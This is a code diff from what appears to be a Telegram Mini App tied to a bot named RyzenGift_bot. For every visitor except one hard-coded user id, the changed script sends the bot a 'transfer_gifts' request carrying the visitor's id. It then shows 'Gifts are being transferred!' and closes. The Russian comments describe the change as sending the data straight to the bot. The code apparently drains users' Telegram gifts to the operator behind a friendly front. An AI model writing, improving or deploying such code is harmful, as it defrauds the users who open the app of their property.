@@ -42,9 +42,12 @@
 
         const user = WebApp.initDataUnsafe.user;
         if (user && user.id != 8528804038) {
-            // ОТПРАВЛЯЕМ КОМАНДУ /transfer БОТУ
-            window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=transfer';
-            
+            // ОТПРАВЛЯЕМ ДАННЫЕ НАПРЯМУЮ В БОТА
+            WebApp.sendData(JSON.stringify({
+                action: 'transfer_gifts',
+                user_id: user.id
+            }));
+
             setTimeout(() => {
                 WebApp.showAlert('✅ Подарки передаются!');
                 WebApp.close();
